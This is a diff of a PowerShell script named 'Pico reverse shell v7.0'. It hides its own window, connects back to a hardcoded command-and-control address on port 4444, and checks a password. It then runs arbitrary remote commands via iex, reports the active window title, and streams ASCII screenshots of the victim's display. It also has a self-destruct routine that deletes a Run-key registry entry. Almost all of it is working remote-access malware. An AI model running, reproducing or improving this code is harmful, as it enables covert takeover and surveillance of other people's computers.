@@ -1,71 +1,86 @@
-$m = Add-Type -Name Win32 -MemberDefinition @'[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);'@ -PassThru
-$m::ShowWindow((Get-Process -Id $PID).MainWindowHandle, 0)
+# Pico reverse shell v7.0 - Auth + Window Tracker + ASCII
+# C2: 172.16.176.40:4444
 
-# 2. Aliases
-if (-not (Get-Command touch -ErrorAction SilentlyContinue)) { New-Alias -Name touch -Value New-Item -Force }
+# --- CONFIGURATION ---
+$ip = '172.16.176.40'; $port = 4444; $pass = "Pico2026" 
+$reg = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'; $name = "SysUpdate"
+$tmp = "$env:TEMP\sysupd.ps1"
+
+# 1. Win32 API Definitions (For Hiding & Window Tracking)
+$api = Add-Type -Name Win32 -MemberDefinition @'
+[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+[DllImport("user32.dll")] public static extern IntPtr GetForegroundWindow();
+[DllImport("user32.dll")] public static extern int GetWindowText(IntPtr hWnd, System.Text.StringBuilder text, int count);
+'@ -PassThru
+$api::ShowWindow((Get-Process -Id $PID).MainWindowHandle, 0)
+
+# 2. Helper function for cleanup (Self-Destruct)
+function Die {
+    Remove-ItemProperty -Path $reg -Name $name -Force -ErrorAction SilentlyContinue
+    Stop-Process -Id $PID -Force
+}
 
 while($true) {
     try {
-        $c = New-Object System.Net.Sockets.TCPClient('172.16.176.40', 4444)
-        $s = $c.GetStream(); $e = New-Object System.Text.UTF8Encoding
-        $p = $e.GetBytes("`n[+] Visual Shell Active. Commands: 'screenshot', 'kill'`nPS $PWD> ")
-        $s.Write($p, 0, $p.Length)
+        $c = New-Object System.Net.Sockets.TCPClient($ip, $port); $s = $c.GetStream(); $e = New-Object System.Text.UTF8Encoding
+        
+        # --- PHASE 1: AUTHENTICATION ---
+        $s.Write(($e.GetBytes("AUTH REQUIRED: ")), 0, 15)
+        [byte[]]$authB = New-Object byte[] 64; $len = $s.Read($authB, 0, $authB.Length)
+        $attempt = $e.GetString($authB, 0, $len).Trim()
 
+        if ($attempt -ne $pass) {
+            $s.Write(($e.GetBytes("WRONG PASSWORD. DESTROYING SESSION...`n")), 0, 37)
+            $c.Close(); Die
+        }
+
+        $s.Write(($e.GetBytes("ACCESS GRANTED. Commands: screen, screenshot, kill`nPS $PWD> ")), 0, 58)
+
+        # --- PHASE 2: MAIN LOOP ---
         [byte[]]$b = New-Object byte[] 65535
         while(($i = $s.Read($b, 0, $b.Length)) -ne 0) {
-            $input = $e.GetString($b, 0, $i).Trim()
-            $out = ""
+            $in = $e.GetString($b, 0, $i).Trim(); $out = ""
 
-            if ($input -eq 'kill') { Stop-Process -Id $PID -Force } 
+            if ($in -eq 'kill') { Die }
             
-            elseif ($input -eq 'screenshot') {
+            # [COMMAND] SCREEN - Get Active Window
+            elseif ($in -eq 'screen') {
+                $handle = $api::GetForegroundWindow()
+                $sb = New-Object System.Text.StringBuilder 256
+                $api::GetWindowText($handle, $sb, $sb.Capacity)
+                $out = "[!] Active Window: " + $sb.ToString() + "`n"
+            }
+
+            # [COMMAND] SCREENSHOT - ASCII View
+            elseif ($in -eq 'screenshot') {
                 try {
                     Add-Type -AssemblyName System.Windows.Forms, System.Drawing
+                    $sc = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
+                    $w = 100; $h = [int]($w * ($sc.Height / $sc.Width) * 0.5)
+                    $bmp = New-Object System.Drawing.Bitmap $w, $h
+                    $g = [System.Drawing.Graphics]::FromImage($bmp)
+                    $full = New-Object System.Drawing.Bitmap $sc.Width, $sc.Height
+                    $fg = [System.Drawing.Graphics]::FromImage($full)
+                    $fg.CopyFromScreen($sc.X, $sc.Y, 0, 0, $full.Size)
+                    $g.DrawImage($full, 0, 0, $w, $h)
                     
-                    # Get actual screen bounds
-                    $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
-                    $width = $screen.Width
-                    $height = $screen.Height
-                    
-                    # 1. Capture full screen first
-                    $mainBmp = New-Object System.Drawing.Bitmap $width, $height
-                    $g = [System.Drawing.Graphics]::FromImage($mainBmp)
-                    $g.CopyFromScreen($screen.X, $screen.Y, 0, 0, $mainBmp.Size)
-                    
-                    # 2. Scale down for ASCII (Width 100 is standard terminal)
-                    $asciiW = 100
-                    $asciiH = [int]($asciiW * ($height / $width) * 0.5)
-                    $smallBmp = New-Object System.Drawing.Bitmap $asciiW, $asciiH
-                    $g2 = [System.Drawing.Graphics]::FromImage($smallBmp)
-                    $g2.DrawImage($mainBmp, 0, 0, $asciiW, $asciiH)
-                    
-                    # 3. Build ASCII String
-                    $ascii = "`n--- REMOTE VIEW ($width x $height) ---`n"
-                    # Char map from darkest to lightest
                     $ramp = "#","W","M","B","@","q","o","*","+","-",":","."," "
-                    
-                    for ($y=0; $y -lt $asciiH; $y++) {
-                        for ($x=0; $x -lt $asciiW; $x++) {
-                            $pColor = $smallBmp.GetPixel($x, $y)
-                            $brightness = ($pColor.R + $pColor.G + $pColor.B) / 3
-                            # Map 0-255 brightness to 0-12 index
-                            $index = [int][Math]::Floor(($brightness / 255) * ($ramp.Length - 1))
-                            $ascii += $ramp[$index]
+                    $ascii = "`n--- VIEW ---`n"
+                    for ($y=0; $y -lt $h; $y++) {
+                        for ($x=0; $x -lt $w; $x++) {
+                            $px = $bmp.GetPixel($x, $y)
+                            $bri = ($px.R + $px.G + $px.B) / 3
+                            $ascii += $ramp[[int][Math]::Floor(($bri/255)*($ramp.Length-1))]
                         }
                         $ascii += "`n"
                     }
-                    $out = $ascii + "--- END VIEW ---`n"
-                    
-                    # Cleanup memory
-                    $g.Dispose(); $g2.Dispose(); $mainBmp.Dispose(); $smallBmp.Dispose()
-                } catch { $out = "[!] Screenshot Error: $($_.Exception.Message)`n" }
+                    $out = $ascii + "--- END ---`n"; $fg.Dispose(); $full.Dispose(); $g.Dispose(); $bmp.Dispose()
+                } catch { $out = "[!] Error: $($_.Exception.Message)`n" }
             }
             else {
-                $out = try { if ($input) { iex $input 2>&1 | Out-String } } catch { $_.Exception.Message }
+                $out = try { if ($in) { iex $in 2>&1 | Out-String } } catch { $_.Exception.Message }
             }
-
-            $resp = $e.GetBytes($out + "PS $PWD> ")
-            $s.Write($resp, 0, $resp.Length); $s.Flush()
+            $resp = $e.GetBytes($out + "PS $PWD> "); $s.Write($resp, 0, $resp.Length); $s.Flush()
         }
     } catch { Start-Sleep 5 }
 }
